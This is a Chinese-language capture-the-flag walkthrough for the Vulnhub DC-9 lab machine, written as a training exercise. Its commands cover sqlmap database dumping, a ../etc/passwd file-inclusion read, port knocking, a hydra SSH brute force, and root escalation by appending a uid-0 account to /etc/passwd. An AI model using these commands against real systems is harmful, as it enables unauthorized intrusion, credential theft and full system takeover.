---
title: Vulnhub-dc9
---

# Vulnhub-dc9

## 靶机信息

### 下载链接

[https://www.vulnhub.com/entry/dc-9,412/](https://www.vulnhub.com/entry/dc-9,412/)

### 目标

获得root权限和flag。

### 运行环境

靶机：NAT模式，靶机自动获取IP
攻击机：windows10、kali linux2021.1

## 信息收集

### 目标发现

```shell
arp-scan -l
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(19).png)

### 端口和服务识别

使用nmap扫描1-65535全端口，并做服务指纹识别，扫描结果保存到txt文件，命令：

```shell
nmap -p1-65535 -A 192.168.160.200 -oN dc9.txt
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(18).png)

发现目标主机端口和服务

```shell
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
```

扫描后，我们看到端口 22 被检测到但被过滤了，这表明确实有 SSH 服务，但有些东西从内部阻止了它。开启了 80 端口和 Apache httpd 服务。

## 漏洞挖掘

我们从端口 80 入手并尝试在我们的浏览器上访问。主页如下图所示

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(17).png)

按个访问首页选项目录，但没有发现任何可用的东西，但发现了一个搜索框![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(16).png)

可能存在sql注入，为了测试此搜索框中的 SQL 注入，在搜索表单中随意输入并通过单击搜索按钮发送请求。用 BurpSuite 拦截请求包。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(15).png)

复制拦截的POST请求并粘贴到一个文本文件，并将其命名为 sql.txt。这样做是为了将拦截的请求与 sqlmap 一起使用。使用 sqlmap 来检查搜索表单是否容易受到 SQL 注入攻击。如果它存在SQL注入攻击，将会爆出目标的数据库。

```shell
sqlmap -r sql.txt --dbs --batch
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(14).png)

成功爆出数据库：`information_schema`、`Staff`和`user`，存在sql注入，下面我们开始接着用SQLmap爆数据库的内容，因为 sqlmap 不允许同时使用多个数据库。我们将首先枚举`staff`数据

```shell
sqlmap -r sql.txt -D Staff --dump-all --batch
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(13).png)

员工数据库包含 2 个表。第一个表由电子邮件 ID、电话号码、名字、姓氏和用户的职位组成，第二个表由用户名和密码哈希组成。用户名是“ **admin** ”。所以，它暗示我们这可能是一个重要的帐户。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(12).png)

在继续进行哈希破解之前，让我们也枚举另一个数据库。名为users 的数据库。我们将再次以与之前类似的方式使用 sqlmap，但根据 -D 参数更改数据库名称，如下所示：

```python
sqlmap -r sql.txt -D users --dump-all --batch
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(11).png)

让我们回到我们的哈希,到[https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)直接解密

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(10).png)

破解的密码是`transorbital1`

现在我们有了管理员密码，我们有一个包含登录验证页面的管理选项卡。输入刚刚破解的密码。登入后出现了管理和添加记录。但让我们眼前一亮的是页脚。现在它说“文件不存在”。这意味着必须有一个包含在页脚中的文件现在丢失或放错了位置。这意味着这里可能存在文件包含漏洞

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(9).png)

我们尝试使用最常见的 文件包含测试 URL 参数对其进行测试。我们在 URL 中插入测试参数，然后是welcome.php 文件。我们确实添加了“?file=”，以便它可以指向服务器上的本地文件。我们尝试查找 /etc/passwd 文件。我们看到它是可访问的。这证明我们确实存在文件包含漏洞。

```
?file=../../../../../../../etc/passwd
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(8).png)

我们开始利用文件包含漏洞读取目标机器上的不同文件。偶然发现knockd.conf 的时候。这意味着涉及端口敲门。我们看到我们在这里配置了一个序列的 openSSH。我们记下这个序列并在这个序列中敲击 SSH 端口以使其启动并运行。

我们使用nc进行端口敲门。一定要按顺序敲门

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(6).png)

现在我们有了 SSH 服务，我们需要密码才能进入。我们尝试了在 Web服务上使用的相同凭据，但没有成功。利用之前sqlmap爆出的用户数据库，为SSH Service的暴力破解制作了2个字典（user.txt和pass.txt）。

创建 user.txt 和 pass.txt 字典后，我们使用 hydra 工具对目标机器上的 SSH 服务进行暴力破解。经过一些尝试，我们看到用户 janitor 是具有 SSH 访问权限的用户。

```
hydra -L user.txt -P pass.txt 192.168.160.200 ssh
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(5).png)

登陆成功后，查看目录文件以及对应权限，发现有一个隐藏的目录，标记为“ **secrets-for-putin** ”。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(4).png)

我们使用 cd 命令在新发现的隐藏目录中遍历。再次列出此目录中的所有内容，找到名为 `passwords-found-on-post-it-notes.txt`的文本文件。我们使用 cat 命令读取该txt得到了一系列密码。![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(3).png)

编辑上面的 pass.txt 文件，并将新找到的密码附加到它。我们再次运行了 hydra bruteforce。这次我们看到我们有一些额外的有效登录账户以及密码

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(2).png)

```
fredf:B4-Tru3-001
```

以 fredf 用户登录后，检查这个 fredf 用户有什么样的 sudo 权限，看到它可以在不输入任何密码的情况下以 root 用户身份运行一个名为test的程序。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(1).png)

查看test程序，它是一个简单的数据附加程序。它将以 2 个文件作为参数，然后将第一个文件的内容附加到第二个文件中。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1 (22).png)

## 权限提升

现在要提升权限，需要创建一个具有 root 访问权限的新用户，并使用 test 文件在 /etc/passwd 文件中创建该用户的ID。让我们创建一个用户及其密码哈希。可以使用 openssl 完成此任务。首先创建了一个名为 ckc的用户，密码为 空，得到了哈希值。

```shell
openssl passwd -1 -salt ckc
```

添加用户名、冒号 (:) 和“:0:0::”来创建可以充当 root 用户的id。之后，我们使用echo 命令在/tmp 目录中创建了一个名为getflag的文件。然后我们使用我们之前在 getflag文件中找到的测试程序，并将我们刚刚创建的用户哈希附加到 /etc/passwd 文件中。在此之后，我们以我们创建的用户 ckc 登录。因为设置得是空密码，所以直接回车。

```shell
echo 'ckc:$1$ckc$GVTd2x3Qys1gVqT2FSw6Z/:0:0::/root:/bin/bash' >> /tmp/getflag
sudo ./test /tmp/getflag /etc/passwd
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(21).png)

成功提权并得到flag

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-dc9-1%20(20).png)